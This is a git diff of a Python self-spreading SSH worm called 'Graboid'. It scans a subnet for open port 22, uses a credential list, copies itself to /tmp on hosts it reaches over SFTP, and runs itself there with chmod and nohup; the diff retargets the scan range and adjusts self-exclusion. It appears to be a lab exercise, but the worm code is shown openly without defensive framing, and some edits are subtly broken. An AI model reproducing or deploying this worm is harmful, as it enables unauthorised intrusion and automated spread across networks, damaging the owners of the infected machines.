@@ -43,9 +43,9 @@ Credential_List = [
 
 #Worm markers
 infected_Marker = "/tmp/is_infected.txt"
-worm_Loc = "/tmp/Graboid.py"
+worm_Loc = "/tmp/Graboid"
 loopback = "lo"
-host_Marker = "/home/echo1_9er/Desktop/base.txt"
+host_Marker = "/home/kali/Desktop/base.txt"
 worm_Msg = "They say there's nothing new under the sun. But under the ground..."
 comp_Msg = "There be a Graboid in these parts"
 
@@ -54,9 +54,9 @@ comp_Msg = "There be a Graboid in these parts"
 #Returns list of IP address on the listed network
 def scanner():
   portScanner = nmap.PortScanner()
-  portScanner.scan("192.168.56.1/24", arguments = "-p 22 --open")
+  # portScanner.scan("192.168.56.1/24", arguments = "-p 22 --open")
 
-  # portScanner.scan("172.31.19.1/24", arguments = "-p 22 --open")
+  portScanner.scan("172.31.19.1/24", arguments = "-p 22 --open")
 
   # hosts = [portScanner.all_hosts()]
   # target = hosts[0]
@@ -83,15 +83,16 @@ def isInfected():
 #Spread and execute
 def tunnelexe(sshTGT, sftpTGT):
     try:
-        sftpTGT.put(TGT_file("Graboid.py" ), "/tmp/" + "Graboid.py")
+        sftpTGT.put(TGT_file("Graboid" ), "/tmp/" + "Graboid")
         
         # sshTGT.exec_command("sudo apt-get -y install python3")
         # sshTGT.exec_command("sudo apt-get -y install python3-pip")
         # sshTGT.exec_command("pip install paramiko")
         # sshTGT.exec_command("pip install netifaces")        
         # sshTGT.exec_command("python3 -m pip install python-nmap")
-        sshTGT.exec_command("chmod a+x /tmp/Graboid.py" )
-        sshTGT.exec_command("./tmp/Graboid.py")
+        sshTGT.exec_command("chmod a+x /tmp/Graboid")
+        sshTGT.exec_command( "nohup python3 /tmp/Graboid")
+        sshTGT.exec_command("/tmp/Graboid.py")
         
     except:
         print(sys.exc_info()[0])
@@ -136,7 +137,7 @@ def thisIP(interface):
   for net in networkInter:
     addr = netifaces.ifaddresses(net)[2][0]['addr']
     if not addr == "127.0.0.1":
-      ip_addr = addr
+      ip_addr = [addr]
       break
   # ip_addr = (([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")] or [[(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) + ["no IP found"])[0]
 
@@ -144,6 +145,7 @@ def thisIP(interface):
   return ip_addr
 
 #find_file
+
 def TGT_file(fname):
   dir_path = os.path.dirname(os.path.realpath(__file__))
   
@@ -185,7 +187,13 @@ def main():
     networkHosts = scanner()
     print(networkHosts)
     
-    networkHosts.remove(ip_addr)
+    for ip in networkHosts:
+      if ip == ip_addr:
+        networkHosts.remove(ip)
+      else:
+        continue
+
+    # networkHosts.remove(ip_addr)
     
     #suffle hosts for spreading
     random.shuffle(networkHosts)
